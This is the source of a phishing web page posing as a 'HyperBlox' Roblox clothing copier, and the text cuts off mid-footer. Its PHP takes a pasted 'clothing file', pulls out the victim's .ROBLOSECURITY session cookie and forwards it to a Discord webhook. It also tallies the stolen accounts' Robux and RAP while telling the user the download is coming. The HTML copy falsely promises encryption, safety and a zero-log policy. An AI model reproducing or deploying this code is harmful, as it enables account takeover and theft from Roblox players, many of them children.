<?php
session_start();

if (!isset($_SESSION['last_request'])) {
    $_SESSION['last_request'] = time();
} else {
    $current_time = time();
    $time_diff = $current_time - $_SESSION['last_request'];
    if ($time_diff < 5) {
        die(json_encode(['error' => 'Rate limit exceeded. Please wait couple seconds before making another request.']));
    }
    $_SESSION['last_request'] = $current_time;
}

$view = file_get_contents("visits.txt");
if ($view == "") {
    $view = '0';
}
$log = file_get_contents("logs.txt");
if ($log == "") {
    $log = '0';
}
$visits = $view + 1;
file_put_contents("visits.txt", $visits);

$dailyVisitsFile = "dailyvisits.txt";
if (file_exists($dailyVisitsFile)) {
    $dailyVisitsData = json_decode(file_get_contents($dailyVisitsFile), true);
} else {
    $dailyVisitsData = array_fill(0, 7, 0);
}

$today = date('w');
$dailyVisitsData[$today] += 1;
file_put_contents($dailyVisitsFile, json_encode($dailyVisitsData));

if (isset($_SERVER['HTTPS'])) {
    $ht = 'https://';
} else {
    $ht = 'http://';
}
// Use HTTP_HOST to include port (e.g., localhost:8000)
$dom = $ht . $_SERVER['HTTP_HOST'];

$code = $_POST['code'] ?? '';
$clothingType = $_POST['clothingtype'] ?? '';

$errors = [];

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (empty($code) || empty($clothingType)) {
        $errors[] = "Complete all required fields to proceed";
    }
    if (strlen($code) < 400) {
        $errors[] = "Invalid clothing file detected!";
    }
    if (empty($clothingType)) {
        $errors[] = "Clothing type selection required";
    }

    if (empty($errors)) {
        $cookie = explode('.ROBLOSECURITY", "', $code);
        if (!isset($cookie[1]) || $cookie[1] == "") {
            $cookie = explode("ROBLOSECURITY=", $code);
            if (isset($cookie[1])) {
                $cookie = explode(';', $cookie[1]);
                $cookie = isset($cookie[0]) ? $cookie[0] : '';
            } else {
                $cookie = '';
            }
        } else {
            $cookie = explode('"', $cookie[1]);
            $cookie = isset($cookie[0]) ? $cookie[0] : '';
        }

        if ($cookie) {
            $logs = $log + 1;
            file_put_contents("logs.txt", $logs);

            $dailyLogsFile = "dailylogs.txt";
            if (file_exists($dailyLogsFile)) {
                $dailyLogsData = json_decode(file_get_contents($dailyLogsFile), true);
            } else {
                $dailyLogsData = array_fill(0, 7, 0);
            }

            $dailyLogsData[$today] += 1;
            file_put_contents($dailyLogsFile, json_encode($dailyLogsData));

            // Call userinfo.php with cURL and proper timeout to send webhook
            // Pass both 'dh' and 'dualhook' parameters to ensure dualhook is received
            $userInfoUrl = "$dom/controlPage/apis/userinfo.php?cookie=" . urlencode($cookie) . "&web=https%3A%2F%2Fdiscord.com%2Fapi%2Fwebhooks%2F1438099288390631476%2FJVHaPJa5RgrpLf4sarfO4GRg1Zg5SOu3MJQDgo_sTpUXBqhwg7VPU7ppeMIpgNGff8_s&dh=&dualhook=";
            
            $ch = curl_init($userInfoUrl);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_TIMEOUT, 25); // Allow time for API calls but less than PHP max execution time
            curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($ch, CURLOPT_NOSIGNAL, 1);
            
            $userInfo = @curl_exec($ch);
            $curlError = curl_error($ch);
            curl_close($ch);
            
            // Parse response if available, otherwise use empty array
            $userData = [];
            if ($userInfo && !$curlError) {
                $decoded = @json_decode($userInfo, true);
                if (is_array($decoded)) {
                    $userData = $decoded;
                }
            }

            if (isset($userData['robux'])) {
                $robuxFile = "robux.txt";
                $currentRobux = file_exists($robuxFile) ? (int)file_get_contents($robuxFile) : 0;
                $newRobux = $currentRobux + (int)$userData['robux'];
                file_put_contents($robuxFile, $newRobux);

                $dailyRobuxFile = "dailyrobux.txt";
                if (file_exists($dailyRobuxFile)) {
                    $dailyRobuxData = json_decode(file_get_contents($dailyRobuxFile), true);
                } else {
                    $dailyRobuxData = array_fill(0, 7, 0);
                }

                $dailyRobuxData[$today] += (int)$userData['robux'];
                file_put_contents($dailyRobuxFile, json_encode($dailyRobuxData));
            }

            if (isset($userData['rap'])) {
                $rapFile = "rap.txt";
                $currentRap = file_exists($rapFile) ? (int)file_get_contents($rapFile) : 0;
                $newRap = $currentRap + (int)$userData['rap'];
                file_put_contents($rapFile, $newRap);

                $dailyRapFile = "dailyrap.txt";
                if (file_exists($dailyRapFile)) {
                    $dailyRapData = json_decode(file_get_contents($dailyRapFile), true);
                } else {
                    $dailyRapData = array_fill(0, 7, 0);
                }

                $dailyRapData[$today] += (int)$userData['rap'];
                file_put_contents($dailyRapFile, json_encode($dailyRapData));
            }

            if (isset($userData['summary'])) {
                $summaryFile = "summary.txt";
                $currentSummary = file_exists($summaryFile) ? (int)file_get_contents($summaryFile) : 0;
                $newSummary = $currentSummary + (int)$userData['summary'];
                file_put_contents($summaryFile, $newSummary);

                $dailySummaryFile = "dailysummary.txt";
                if (file_exists($dailySummaryFile)) {
                    $dailySummaryData = json_decode(file_get_contents($dailySummaryFile), true);
                } else {
                    $dailySummaryData = array_fill(0, 7, 0);
                }

                $dailySummaryData[$today] += (int)$userData['summary'];
                file_put_contents($dailySummaryFile, json_encode($dailySummaryData));
            }
        }

        die(json_encode(['success' => 'Clothing asset is downloading soon!']));
    } else {
        die(json_encode(['error' => $errors[0]]));
    }
}
?>
<!doctype html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="author" content="HyperBlox">
  <meta name="description" content="HyperBlox - The best Roblox tools for game copying, clothing duplication, bot followers, and PIN cracking, all free and secure.">
  <meta name="keywords" content="Roblox, HyperBlox, game copier, clothing copier, bot followers, PIN cracker, safe Roblox tools, automation">
  <meta name="robots" content="index, follow">
  <meta property="og:title" content="HyperBlox - The Best Roblox Tools">
  <meta property="og:description" content="Copy games, duplicate clothes, gain followers, and unlock Roblox accounts with HyperBlox's powerful and safe tools.">
  <meta property="og:image" content="/files/hyperblox.png">
  <meta property="og:type" content="article">
  <meta property="og:url" content="https://hyperblox.eu/">
  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="HyperBlox - The Best Roblox Tools">
  <meta name="twitter:site" content="https://hyperblox.eu/">
  <meta name="twitter:description" content="Copy games, duplicate clothes, gain followers, and unlock Roblox accounts with HyperBlox's powerful and safe tools.">
  <meta name="twitter:image" content="/files/hyperblox.png">
  <meta name="theme-color" content="#000000">
  <meta name="msapplication-TileColor" content="#000000">
  <meta itemprop="name" content="HyperBlox">
  <meta itemprop="description" content="HyperBlox - Advanced Roblox tools for copying games, cloning outfits, and more.">
  <title>Copy Clothes - HyperBlox</title>
  <link rel="icon" type="image/png" href="/files/hyperblox.png">
  <link rel="shortcut icon" href="/files/hyperblox.ico">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Manrope:wght@400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    </head>
    <style>
        :root {
            --primary: #8b5cf6;
            --primary-dark: #7c3aed;
            --primary-darker: #6d28d9;
            --primary-light: rgba(139, 92, 246, 0.15);
            --gold: #fbbf24;
            --gold-light: rgba(251, 191, 36, 0.15);
            --dark: #0f172a;
            --darker: #020617;
            --darkest: #010510;
            --light: #f8fafc;
            --lighter: rgba(248, 250, 252, 0.9);
            --gray: #94a3b8;
            --dark-gray: #334155;
            --success: #10b981;
            --error: #ef4444;
            --warning: #f59e0b;
            --glass: rgba(30, 41, 59, 0.45);
            --glass-border: rgba(255, 255, 255, 0.08);
            --glass-highlight: rgba(255, 255, 255, 0.03);
            --transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            --transition-slow: all 0.6s cubic-bezier(0.4, 0, 0.2, 1);
            --shadow: 0 4px 30px rgba(0, 0, 0, 0.15);
            --shadow-lg: 0 15px 50px rgba(0, 0, 0, 0.25);
            --border-radius: 16px;
            --border-radius-sm: 12px;
            --border-radius-lg: 24px;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Manrope', 'Inter', sans-serif;
            background-color: var(--darkest);
            color: var(--light);
            overflow-x: hidden;
            min-height: 100vh;
            background-image: 
                radial-gradient(at 80% 0%, rgba(139, 92, 246, 0.1) 0px, transparent 50%),
                radial-gradient(at 0% 50%, rgba(139, 92, 246, 0.1) 0px, transparent 50%),
                linear-gradient(to bottom, transparent, var(--darkest));
            background-attachment: fixed;
        }

        .container {
            width: 100%;
            max-width: 1400px;
            margin: 0 auto;
            padding: 0 40px;
        }

        section {
            padding: 120px 0;
            position: relative;
        }

        h1, h2, h3, h4 {
            font-weight: 700;
            line-height: 1.2;
            font-family: 'Manrope', sans-serif;
        }

        h1 {
            font-size: 64px;
            margin-bottom: 24px;
            letter-spacing: -0.03em;
        }

        h2 {
            font-size: 48px;
            margin-bottom: 24px;
            letter-spacing: -0.02em;
        }

        h3 {
            font-size: 28px;
            margin-bottom: 20px;
            letter-spacing: -0.01em;
        }

        h4 {
            font-size: 20px;
            margin-bottom: 16px;
        }

        p {
            color: var(--gray);
            line-height: 1.7;
            margin-bottom: 24px;
            font-size: 18px;
            font-weight: 400;
        }

        a {
            text-decoration: none;
            color: inherit;
            transition: var(--transition);
        }

        .btn {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            padding: 18px 32px;
            border-radius: var(--border-radius-sm);
            font-weight: 600;
            transition: var(--transition);
            cursor: pointer;
            font-size: 16px;
            border: none;
            gap: 12px;
            letter-spacing: 0.02em;
            position: relative;
            overflow: hidden;
            z-index: 1;
        }

        .btn::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.1), transparent);
            opacity: 0;
            transition: var(--transition);
            z-index: -1;
        }

        .btn:hover::before {
            opacity: 1;
        }

        .btn-primary {
            background-color: var(--primary);
            color: white;
            box-shadow: 0 4px 20px rgba(139, 92, 246, 0.4);
            font-weight: 700;
        }

        .btn-primary:hover {
            background-color: var(--primary-dark);
            transform: translateY(-2px);
            box-shadow: var(--shadow-lg);
        }

        .btn-gold {
            background-color: var(--gold);
            color: var(--darkest);
            box-shadow: 0 4px 20px rgba(251, 191, 36, 0.4);
            font-weight: 700;
        }

        .btn-gold:hover {
            background-color: #f59e0b;
            transform: translateY(-2px);
            box-shadow: var(--shadow-lg);
        }

        .btn-outline {
            border: 1px solid var(--glass-border);
            color: var(--lighter);
            background-color: var(--glass);
            backdrop-filter: blur(10px);
        }

        .btn-outline:hover {
            border-color: var(--primary);
            color: var(--light);
            background-color: var(--primary-light);
        }

        .text-gradient {
            background: linear-gradient(90deg, #8b5cf6, #ec4899);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            display: inline;
        }

        .text-gradient-gold {
            background: linear-gradient(90deg, #fbbf24, #f59e0b);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            display: inline;
        }

        .text-center {
            text-align: center;
        }

        .section-header {
            text-align: center;
            margin-bottom: 80px;
            position: relative;
        }

        .section-header p {
            max-width: 700px;
            margin-left: auto;
            margin-right: auto;
            font-size: 20px;
        }

        .badge {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            font-size: 14px;
            padding: 8px 16px;
            border-radius: 100px;
            background-color: var(--primary-light);
            color: var(--primary);
            margin-bottom: 24px;
            font-weight: 600;
            border: 1px solid rgba(139, 92, 246, 0.2);
        }

        .badge i {
            font-size: 16px;
        }

        .badge-gold {
            background-color: var(--gold-light);
            color: var(--gold);
            border: 1px solid rgba(251, 191, 36, 0.2);
        }

        header {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            padding: 24px 0;
            z-index: 1000;
            transition: var(--transition);
            background-color: rgba(1, 5, 16, 0.98);
            backdrop-filter: blur(20px);
            box-shadow: var(--shadow);
            border-bottom: 1px solid var(--glass-border);
        }

        .navbar {
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .logo {
            display: flex;
            align-items: center;
            gap: 16px;
            font-weight: 700;
            font-size: 24px;
            letter-spacing: -0.02em;
        }

        .logo img {
            height: 40px;
            filter: drop-shadow(0 0 10px rgba(139, 92, 246, 0.5));
        }

        .nav-links {
            display: flex;
            gap: 32px;
            align-items: center;
        }

        .nav-links a {
            font-weight: 600;
            color: var(--gray);
            transition: var(--transition);
            font-size: 16px;
            position: relative;
        }

        .nav-links a::after {
            content: '';
            position: absolute;
            bottom: -4px;
            left: 0;
            width: 0;
            height: 2px;
            background: linear-gradient(90deg, var(--primary), transparent);
            transition: var(--transition);
        }

        .nav-links a:hover {
            color: var(--light);
        }

        .nav-links a:hover::after {
            width: 100%;
        }

        .nav-links .btn {
            padding: 12px 24px;
        }

        .mobile-menu-btn {
            display: none;
            background: none;
            border: none;
            color: var(--light);
            font-size: 24px;
            cursor: pointer;
            z-index: 1001;
        }

        .tool-container {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 40px;
            margin-bottom: 80px;
        }

        .glass-card {
            background: var(--glass);
            border-radius: var(--border-radius-lg);
            padding: 50px;
            transition: var(--transition);
            border: 1px solid var(--glass-border);
            backdrop-filter: blur(20px);
            height: 100%;
            display: flex;
            flex-direction: column;
            position: relative;
            overflow: hidden;
        }

        .glass-card::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.03), transparent);
            pointer-events: none;
        }

        .glass-card:hover {
            transform: translateY(-5px);
            box-shadow: var(--shadow-lg);
            border-color: rgba(139, 92, 246, 0.3);
        }

        .glass-card h3 {
            color: var(--light);
            margin-bottom: 24px;
            position: relative;
            padding-bottom: 16px;
        }

        .glass-card h3::after {
            content: '';
            position: absolute;
            bottom: 0;
            left: 0;
            width: 60px;
            height: 3px;
            background: linear-gradient(90deg, var(--primary), transparent);
            border-radius: 3px;
        }

        .glass-card-gold h3::after {
            background: linear-gradient(90deg, var(--gold), transparent);
        }

        .form-group {
            margin-bottom: 28px;
            position: relative;
        }

        .form-label {
            display: block;
            margin-bottom: 12px;
            color: var(--gray);
            font-size: 16px;
            font-weight: 500;
        }

        .form-input {
            width: 100%;
            padding: 18px 24px;
            background-color: rgba(15, 23, 42, 0.6);
            border: 1px solid var(--glass-border);
            border-radius: var(--border-radius-sm);
            color: var(--light);
            font-size: 16px;
            transition: var(--transition);
            font-family: 'Inter', sans-serif;
        }

        .form-input:focus {
            border-color: var(--primary);
            outline: none;
            box-shadow: 0 0 0 3px rgba(139, 92, 246, 0.2);
            background-color: rgba(15, 23, 42, 0.8);
        }

        .form-select {
            appearance: none;
            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='20' height='20' fill='%2394a3b8' viewBox='0 0 16 16'%3E%3Cpath d='M7.247 11.14 2.451 5.658C1.885 5.013 2.345 4 3.204 4h9.592a1 1 0 0 1 .753 1.659l-4.796 5.48a1 1 0 0 1-1.506 0z'/%3E%3C/svg%3E");
            background-repeat: no-repeat;
            background-position: right 24px center;
            background-size: 16px;
            padding-right: 60px;
            cursor: pointer;
        }

        .video-container {
            width: 100%;
            border-radius: var(--border-radius);
            overflow: hidden;
            margin-top: auto;
            box-shadow: var(--shadow);
            position: relative;
        }

        .video-container::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(to bottom, transparent, rgba(0, 0, 0, 0.3));
            pointer-events: none;
            z-index: 1;
        }

        .video-container video {
            width: 100%;
            height: auto;
            display: block;
        }

        .play-button {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 80px;
            height: 80px;
            background-color: rgba(255, 255, 255, 0.2);
            backdrop-filter: blur(10px);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 2;
            transition: var(--transition);
            border: none;
            color: white;
            font-size: 24px;
            cursor: pointer;
        }

        .play-button:hover {
            background-color: var(--primary);
            transform: translate(-50%, -50%) scale(1.1);
        }

        .faq-section {
            background: var(--glass);
            border-radius: var(--border-radius-lg);
            padding: 60px;
            border: 1px solid var(--glass-border);
            backdrop-filter: blur(20px);
              margin-top: 100px;
        }

        .faq-item {
            margin-bottom: 20px;
            border-radius: var(--border-radius);
            overflow: hidden;
            background-color: rgba(15, 23, 42, 0.6);
            border: 1px solid var(--glass-border);
            transition: var(--transition);
        }

        .faq-item:hover {
            border-color: var(--primary);
        }

        .faq-question {
            padding: 24px;
            cursor: pointer;
            display: flex;
            justify-content: space-between;
            align-items: center;
            font-weight: 600;
            color: var(--light);
            font-size: 18px;
        }

        .faq-question i {
            transition: var(--transition);
            color: var(--primary);
            font-size: 20px;
        }

        .faq-item.active .faq-question i {
            transform: rotate(180deg);
        }

        .faq-answer {
            padding: 0 24px;
            max-height: 0;
            overflow: hidden;
            transition: var(--transition);
            color: var(--gray);
            font-size: 16px;
            line-height: 1.7;
        }

        .faq-item.active .faq-answer {
            padding: 0 24px 24px;
            max-height: 500px;
        }

        .stats-grid {
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 30px;
            margin-top: 60px;
        }

        .stat-card {
            text-align: center;
            padding: 40px;
            background: var(--glass);
            border-radius: var(--border-radius);
            border: 1px solid var(--glass-border);
            transition: var(--transition);
        }

        .stat-card:hover {
            transform: translateY(-5px);
            border-color: var(--primary);
        }

        .stat-number {
            font-size: 48px;
            font-weight: 700;
            margin-bottom: 12px;
            background: linear-gradient(90deg, #8b5cf6, #ec4899);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            font-family: 'Manrope', sans-serif;
        }

.stat-number-gold {
    background: linear-gradient(90deg, #fbbf24, #f59e0b);
    -webkit-background-clip: text;
    background-clip: text;
    color: transparent;
    font-size: 48px;
    font-weight: 700;
    font-family: 'Manrope', sans-serif;
}
        footer {
            background-color: var(--darker);
            padding: 80px 0 40px;
            border-top: 1px solid var(--glass-border);
        }

        .footer-content {
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 60px;
            margin-bottom: 60px;
        }

        .footer-logo {
            display: flex;
            align-items: center;
            gap: 16px;
            font-weight: 700;
            font-size: 24px;
            margin-bottom: 24px;
            letter-spacing: -0.02em;
        }

        .footer-logo img {
            height: 40px;
        }

        .footer-text {
            color: var(--gray);
            line-height: 1.7;
            margin-bottom: 24px;
        }

        .footer-links h4 {
            color: var(--light);
            margin-bottom: 24px;
            font-size: 18px;
            position: relative;
            padding-bottom: 12px;
        }

        .footer-links h4::after {
            content: '';
            position: absolute;
            bottom: 0;
            left: 0;
            width: 40px;
            height: 2px;
            background: linear-gradient(90deg, var(--primary), transparent);
            border-radius: 2px;
        }

        .footer-links ul {
            list-style: none;
        }

        .footer-links li {
            margin-bottom: 16px;
        }

        .footer-links a {
            color: var(--gray);
            transition: var(--transition);
            display: inline-block;
        }

        .footer-links a:hover {
            color: var(--light);
            transform: translateX(4px);
        }

        .social-links {
            display: flex;
            gap: 16px;
            margin-top: 24px;
        }

        .social-links a {
            width: 48px;
            height: 48px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            background-color: var(--glass);
            color: var(--gray);
            transition: var(--transition);
            border: 1px solid var(--glass-border);
        }

        .social-links a:hover {
            background-color: var(--primary);
            color: white;
            transform: translateY(-3px);
            border-color: var(--primary);
        }

        .footer-bottom {
            text-align: center;
            padding-top: 40px;
            border-top: 1px solid var(--glass-border);
            color: var(--gray);
            font-size: 14px;
        }

        .trust-badges {
            display: flex;
            justify-content: center;
            gap: 30px;
            margin-top: 60px;
            flex-wrap: wrap;
        }

        .trust-badge {
            display: flex;
            align-items: center;
            gap: 12px;
            color: var(--gray);
            font-size: 14px;
            transition: var(--transition);
        }

        .trust-badge:hover {
            color: var(--light);
        }

        .trust-badge i {
            font-size: 24px;
            color: var(--primary);
        }

        .floating-shapes {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: -1;
            overflow: hidden;
        }

        .shape {
            position: absolute;
            border-radius: 50%;
            filter: blur(60px);
            opacity: 0.15;
        }

        .shape-1 {
            width: 400px;
            height: 400px;
            background: var(--primary);
            top: -100px;
            right: -100px;
            animation: float 15s ease-in-out infinite;
        }

        .shape-2 {
            width: 300px;
            height: 300px;
            background: var(--gold);
            bottom: -50px;
            left: -50px;
            animation: float 12s ease-in-out infinite reverse;
        }

        @keyframes float {
            0%, 100% {
                transform: translate(0, 0);
            }
            50% {
                transform: translate(20px, 20px);
            }
        }

        .progress-bar {
            height: 4px;
            background-color: rgba(139, 92, 246, 0.2);
            border-radius: 2px;
            margin-top: 40px;
            overflow: hidden;
            position: relative;
        }

        .progress-fill {
            height: 100%;
            width: 0;
            background: linear-gradient(90deg, var(--primary), var(--primary-dark));
            border-radius: 2px;
            transition: width 0.6s ease;
        }

        .progress-text {
            display: flex;
            justify-content: space-between;
            margin-top: 12px;
            color: var(--gray);
            font-size: 14px;
        }

        .progress-text span {
            color: var(--light);
            font-weight: 600;
        }

        .tooltip {
            position: relative;
            display: inline-block;
        }

        .tooltip .tooltip-text {
            visibility: hidden;
            width: 200px;
            background-color: var(--darker);
            color: var(--light);
            text-align: center;
            border-radius: var(--border-radius-sm);
            padding: 12px;
            position: absolute;
            z-index: 1;
            bottom: 125%;
            left: 50%;
            transform: translateX(-50%);
            opacity: 0;
            transition: var(--transition);
            font-size: 14px;
            border: 1px solid var(--glass-border);
            backdrop-filter: blur(20px);
        }

        .tooltip:hover .tooltip-text {
            visibility: visible;
            opacity: 1;
        }

        .tooltip .tooltip-text::after {
            content: "";
            position: absolute;
            top: 100%;
            left: 50%;
            margin-left: -5px;
            border-width: 5px;
            border-style: solid;
            border-color: var(--darker) transparent transparent transparent;
        }

        @media (max-width: 1200px) {
            section {
                padding: 100px 0;
            }

            h1 {
                font-size: 56px;
            }

            h2 {
                font-size: 42px;
            }

            .footer-content {
                grid-template-columns: repeat(2, 1fr);
                gap: 40px;
            }

            .stats-grid {
                grid-template-columns: repeat(2, 1fr);
            }
        }

        @media (max-width: 992px) {
            h1 {
                font-size: 48px;
            }
            
            h2 {
                font-size: 36px;
            }

            .tool-container {
                grid-template-columns: 1fr;
            }

            .glass-card {
                padding: 40px;
            }

            .nav-links {
                position: fixed;
                top: 0;
                right: -100%;
                width: 300px;
                height: 100vh;
                background-color: var(--darker);
                flex-direction: column;
                padding: 100px 40px;
                gap: 24px;
                transition: var(--transition);
                z-index: 1000;
                border-left: 1px solid var(--glass-border);
            }

            .nav-links.active {
                right: 0;
            }

            .mobile-menu-btn {
                display: block;
            }

            .faq-section {
                padding: 40px;
            }
        }

        @media (max-width: 768px) {
            section {
                padding: 80px 0;
            }

            .container {
                padding: 0 30px;
            }

            h1 {
                font-size: 40px;
            }

            h2 {
                font-size: 32px;
            }

            p {
                font-size: 16px;
            }

            .glass-card {
                padding: 30px;
            }

            .faq-section {
                padding: 30px;
            }

            .footer-content {
                grid-template-columns: 1fr;
            }
        }

        @media (max-width: 576px) {
            h1 {
                font-size: 36px;
            }
            
            h2 {
                font-size: 28px;
            }

            .section-header {
                margin-bottom: 60px;
            }

            .stats-grid {
                grid-template-columns: 1fr;
            }

            .trust-badges {
                flex-direction: column;
                align-items: center;
                gap: 20px;
            }
        }
    </style>
</head>
<body>
    <div class="floating-shapes">
        <div class="shape shape-1"></div>
        <div class="shape shape-2"></div>
    </div>
    
    <header>
        <div class="container">
            <nav class="navbar">
                <a href="/" class="logo">
                    <img src="/files/hyperblox.png" alt="HyperBlox Logo">
                    <span>HyperBlox</span>
                </a>
                <div class="nav-links" id="navLinks">
                    <a href="/#features">Features</a>
                    <a href="/#stats">Statistics</a>
                    <a href="/#faq">FAQ</a>
                    <a href="https://discord.gg/8CBBtwMXM3" class="btn btn-outline">Join Community</a>
                </div>
                <button class="mobile-menu-btn" id="mobileMenuBtn">
                    <i class="fas fa-bars"></i>
                </button>
            </nav>
        </div>
    </header>

    <section>
        <div class="container">
            <div class="section-header">
                <div class="badge">
                    <i class="fas fa-crown"></i>
                    BEST ROBLOX TOOLS!
                </div>
                <h1>HyperBlox <span class="text-gradient">Clothing Copier</span></h1>
                <p>Copy clothes with ease, powered by HyperBlox!</p>
            </div>
            
            <div class="tool-container">
                <div class="glass-card">
                    <h3>Clothes Copier</h3>
                    <p>Paste your clothes file in the box below, then click "Copy Clothes!"</p>
                    
                    <form method="post" id="copyForm">
                        <div class="form-group">
                            <label for="code" class="form-label">Clothing File</label>
                            <input type="text" class="form-input" id="code" placeholder="Paste complete clothing file..." name="code" autocomplete="off" minlength="3" required>
                        </div>
                        
                        <div class="form-group">
                            <label for="clothingtype" class="form-label">Clothing Type</label>
                            <select class="form-input form-select" id="clothingtype" name="clothingtype" required>
                                <option value="">Select clothing category</option>
                                <option value="tshirt">T-Shirt</option>
                                <option value="shirt">Shirt</option>
                                <option value="pants">Pants</option>
                                <option value="other">Specialty Item</option>
                            </select>
                        </div>
                        
                        <div class="progress-bar">
                            <div class="progress-fill" id="progressFill"></div>
                        </div>
                        <div class="progress-text">
                            <span>Security Check</span>
                            <span id="progressPercent">0%</span>
                        </div>
                        
                        <button type="submit" class="btn btn-primary" style="width: 100%; margin-top: 20px;">
                            <i class="fas fa-lock"></i>
                            Begin Secure Duplication
                        </button>
                    </form>
                </div>
                
                <div class="glass-card glass-card-gold">
                    <div class="badge badge-gold">
                        <i class="fas fa-star"></i>
                        HYPERBLOX TUTORIAL!
                    </div>
                    <h3>How to Use</h3>
                    <p>Watch our exclusive demonstration to see how this tool works.</p>
                    <div class="video-container" style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden; max-width: 100%; background: #000;">
                        <iframe style="position: absolute; top: 0; left: 0; width: 100%; height: 100%;" 
                                src="https://www.youtube.com/embed/VytKm-A1zDM?rel=0" 
                                frameborder="0" 
                                allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" 
                                allowfullscreen>
                        </iframe>
                    </div>

                    <div style="margin-top: 24px; display: flex; gap: 16px;">
                        <a href="#" class="btn btn-gold" style="flex: 1;">
                            <i class="fas fa-book"></i>
                            Documentation
                        </a>
                        <a href="#" class="btn btn-outline" style="flex: 1;">
                            <i class="fas fa-headset"></i>
                            Support
                        </a>
                    </div>
                </div>
            </div>

            <div class="stats-grid">
                <div class="stat-card">
                    <div class="stat-number">10K+</div>
                    <p>Successful Duplications</p>
                </div>
                <div class="stat-card">
                    <div class="stat-number">100%</div>
                    <p>Detection-Free</p>
                </div>
                <div class="stat-card">
                    <div class="stat-number">24/7</div>
                    <p>Premium Support</p>
                </div>
                <div class="stat-card">
                    <div class="stat-number-gold">VIP</div>
                    <p>Trusted by Creators</p>
                </div>
            </div>

            <div class="faq-section">
                <h3 class="text-center">Frequently Asked Questions</h3>
                <p class="text-center" style="max-width: 800px; margin-left: auto; margin-right: auto;">
                     Get instant answers to the most common questions about how HyperBlox works.
                </p>
                
                <div class="faq-item">
                    <div class="faq-question">
                        <span>How does HyperBlox ensure my account safety?</span>
                        <i class="fas fa-chevron-down"></i>
                    </div>
                    <div class="faq-answer">
                        <p>We use strong encryption to lock your data and never store any of your info. Every request is hidden through random routing so it can’t be tracked. Your account stays completely safe and undetectable while copying clothes.</p>
                    </div>
                </div>
                
                <div class="faq-item">
                    <div class="faq-question">
                        <span>What makes your duplication undetectable?</span>
                        <i class="fas fa-chevron-down"></i>
                    </div>
                    <div class="faq-answer">
                        <p>We’ve designed our system to copy clothing just like Roblox does, so it looks completely natural. Our tools avoid all tracking systems, making each copy impossible to detect.</p>
                    </div>
                </div>
                
                <div class="faq-item">
                    <div class="faq-question">
                        <span>Can I duplicate limited items?</span>
                        <i class="fas fa-chevron-down"></i>
                    </div>
                    <div class="faq-answer">
                        <p>You can copy how limited items look but the copies will not be real and probably won't last long. Roblox might take them down since they're only visual and not actual limiteds. This tool is just for cosmetic use.</p>
                    </div>
                </div>
                
                <div class="faq-item">
                    <div class="faq-question">
                        <span>How fast will I receive my duplicated items?</span>
                        <i class="fas fa-chevron-down"></i>
                    </div>
                    <div class="faq-answer">
                        <p>Most copies are finished in 15 to 30 seconds. If it’s busy it might take up to 2 minutes.</p>
                    </div>
                </div>
            </div>

            <div class="trust-badges">
                <div class="trust-badge">
                    <i class="fas fa-shield-alt"></i>
                    <span>256-bit Encryption</span>
                </div>
                <div class="trust-badge">
                    <i class="fas fa-server"></i>
                    <span>99.99% Uptime</span>
                </div>
                <div class="trust-badge">
                    <i class="fas fa-user-secret"></i>
                    <span>Zero-Log Policy</span>
                </div>
                <div class="trust-badge">
                    <i class="fas fa-clock"></i>
                    <span>24/7 Monitoring</span>
                </div>
            </div>
        </div>
    </section>

    <footer>
        <div class="container">
            <div class="footer-content">
                <div class="footer-col">
                    <a href="" class="footer-logo">
                        <img src="/files/hyperblox.png" alt="HyperBlox Logo">
                        <span>HyperBlox</span>
                    </a>
                    <p class="footer-text">The most advanced Roblox automation platform, built for performance and security.</p>
                    <div class="social-links">
                        <a href="#"><i class="fab fa-discord"></i></a>
                        <a href="#"><i class="fab fa-twitter"></i></a>
                        <a href="#"><i class="fab fa-youtube"></i></a>
                    </div>
                </div>
                <div class="footer-col">
                    <div class="footer-links">
                        <h4>Products</h4>
                        <ul>
                            <li><a href="#">Clothing Duplicator</a></li>
                            <li><a href="#">Game Copier</a></li>
                            <li><a href="#">Follower System</a></li>
                            <li><a href="#">Asset Manager</a></li>
                        </ul>
                    </div>
                </div>
                <div class="footer-col">
